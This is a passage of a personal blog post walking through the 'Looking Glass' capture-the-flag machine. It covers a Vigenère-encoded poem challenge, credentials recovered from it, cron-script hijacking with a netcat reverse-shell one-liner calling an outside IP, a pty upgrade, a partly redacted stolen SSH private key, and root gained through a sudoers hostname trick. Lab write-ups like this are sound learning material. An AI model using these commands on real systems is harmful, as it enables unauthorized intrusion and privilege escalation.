+You&#39;ve found the real service.
+Solve the challenge to get access to the box
+Jabberwocky
+&#39;Mdes mgplmmz, cvs alv lsmtsn aowil
+Fqs ncix hrd rxtbmi bp bwl arul;
+Elw bpmtc pgzt alv uvvordcet,
+Egf bwl qffl vaewz ovxztiql.
+
+&#39;Fvphve ewl Jbfugzlvgb, ff woy!
+Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
+Bplhrf xag Rjinlu imro, pud tlnp
+Bwl jintmofh Iaohxtachxta!&#39;
+
+Oi tzdr hjw oqzehp jpvvd tc oaoh:
+Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
+Hv rfwmgl wl fp moi Tfbaun xkgm,
+Puh jmvsd lloimi bp bwvyxaa.
+
+Eno pz io yyhqho xyhbkhe wl sushf,
+Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
+Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
+Pud cykdttk ej ba gaxt!
+
+Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
+Ewl vpvict qseux dine huidoxt-achgb!
+Al peqi pt eitf, ick azmo mtd wlae
+Lx ymca krebqpsxug cevm.
+
+&#39;Ick lrla xhzj zlbmg vpt Qesulvwzrr?
+Cpqx vw bf eifz, qy mthmjwa dwn!
+V jitinofh kaz! Gtntdvl! Ttspaj!&#39;
+Wl ciskvttk me apw jzn.
+
+&#39;Awbw utqasmx, tuh tst zljxaa bdcij
+Wph gjgl aoh zkuqsi zg ale hpie;
+Bpe oqbzc nxyi tst iosszqdtz,
+Eew ale xdte semja dbxxkhfe.
+Jdbr tivtmi pw sxderpIoeKeudmgdstd
+Enter Secret:
+</code></pre><p>Not ROT13&hellip;more like vigenère but I got no key&hellip;</p>
+<p>hey! let&rsquo;s try to bruteforce it online&hellip;</p>
+<p>Bingo! once we submit the secret we found, we get <code>jabberwock</code> credentials</p>
+<pre tabindex="0"><code>Eew ale xdte semja dbxxkhfe.
+Jdbr tivtmi pw sxderpIoeKeudmgdstd
+Enter Secret:
+jabberwock:CornersHoldingNicelyStopped
+</code></pre><h2 id="exploitation">Exploitation</h2>
+<pre tabindex="0"><code>jabberwock@looking-glass:~$ ls -al
+total 44
+drwxrwxrwx 5 jabberwock jabberwock 4096 Jul  3  2020 .
+drwxr-xr-x 8 root       root       4096 Jul  3  2020 ..
+lrwxrwxrwx 1 root       root          9 Jul  3  2020 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 jabberwock jabberwock  220 Jun 30  2020 .bash_logout
+-rw-r--r-- 1 jabberwock jabberwock 3771 Jun 30  2020 .bashrc
+drwx------ 2 jabberwock jabberwock 4096 Jun 30  2020 .cache
+drwx------ 3 jabberwock jabberwock 4096 Jun 30  2020 .gnupg
+drwxrwxr-x 3 jabberwock jabberwock 4096 Jun 30  2020 .local
+-rw-r--r-- 1 jabberwock jabberwock  807 Jun 30  2020 .profile
+-rw-rw-r-- 1 jabberwock jabberwock  935 Jun 30  2020 poem.txt
+-rwxrwxr-x 1 jabberwock jabberwock   38 Jul  3  2020 twasBrillig.sh
+-rw-r--r-- 1 jabberwock jabberwock   38 Jul  3  2020 user.txt
+jabberwock@looking-glass:~$ cat user.txt
+...
+</code></pre><pre tabindex="0"><code>jabberwock@looking-glass:~$ sudo -l
+Matching Defaults entries for jabberwock on looking-glass:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jabberwock may run the following commands on looking-glass:
+(root) NOPASSWD: /sbin/reboot
+</code></pre><p>Lol what?</p>
+<pre tabindex="0"><code>jabberwock@looking-glass:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
+</code></pre><p>Oh okay!</p>
+<pre tabindex="0"><code>jabberwock@looking-glass:~$ echo &#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.4.19 4444 &gt;/tmp/f&#34; &gt; twasBrillig.sh
+jabberwock@looking-glass:~$ sudo reboot
+Connection to 10.10.20.224 closed by remote host.
+Connection to 10.10.20.224 closed.
+</code></pre><p>Be careful there!</p>
+<p>if you mess up, you have to re-do everything, as you are rebooting the machine!</p>
+<pre tabindex="0"><code>└──╼ $nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 37914
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ id
+uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
+</code></pre><pre tabindex="0"><code>$ ls
+humptydumpty.txt
+poem.txt
+$ cat humptydumpty.txt
+dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
+7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
+28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
+b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
+fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
+b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
+5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
+7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
+</code></pre><p>Seriously&hellip;you got this one</p>
+<p><code>the password is [REDACTED]</code></p>
+<pre tabindex="0"><code>$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+tweedledum@looking-glass:~$ su humptydumpty
+su humptydumpty
+Password: [REDACTED]
+
+humptydumpty@looking-glass:/home/tweedledum$ id
+id
+uid=1004(humptydumpty) gid=1004(humptydumpty) groups=1004(humptydumpty)
+</code></pre><p>That guy just got another POEM in his folder so dead-end!</p>
+<p>after a mad long time of confused enumeration (linpeas and stuff), we notice we have some weird permissions over alice folder</p>
+<p>We have execute permission!</p>
+<pre tabindex="0"><code>humptydumpty@looking-glass:~$ cat /home/alice/.ssh/id_rsa
+cat /home/alice/.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
+NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
+X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
+/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
+ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
+zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
+WfE                                               Q+GO+5BBg38+aJ
+cUIN [REDACTED BECAUSE YOU HAVE TO SUFFER!]  ena/HyWLxXWHxG6ji7aW
+DmtV                                           mlR+RHCb40pZjBgr5
+8bjJl                                          r5wzzJpWBAoGBAM1R
+aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
+wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
+WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
+SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
+X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
++zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
+oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
+aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
+-----END RSA PRIVATE KEY-----
+</code></pre><pre tabindex="0"><code>└──╼ $chmod 600 alice.rsa
+
+└──╼ $ssh alice@10.10.20.224 -i alice.rsa
+Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
+</code></pre><p>Now what?</p>
+<p>After another big time of confusion (forums and stuff) I got it!</p>
+<pre tabindex="0"><code>alice@looking-glass:~$ cat /etc/sudoers.d/alice
+alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
+</code></pre><p>Alice can get a root shell on the host but &ldquo;reversed&rdquo;</p>
+<p>so we specify the host in our sudo command</p>
+<pre tabindex="0"><code>alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
+sudo: unable to resolve host ssalg-gnikool
+root@looking-glass:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p>that was cool!</p>
+<pre tabindex="0"><code>root@looking-glass:/root# cat the_end.txt
+She took her off the table as she spoke, and shook her backwards and forwards with all her might.
+
+The Red Queen made no resistance whatever; only her face grew very small, and her eyes got large and green: and still, as Alice went on shaking her, she kept on growing shorter—and fatter—and softer—and rounder—and—
+
+—and it really was a kitten, after all.
+</code></pre><h2 id="extra-notes">Extra notes:</h2>
+<p>This machine was very original and fun, and reading the afterwards forums I learnt that the correct SSH port and first access credentials changed on every reboot!
+So my port might be different from yours and I think it&rsquo;s a great thing!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="http://localhost:1313/">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>
+
+
+
+    </body>
+</html>
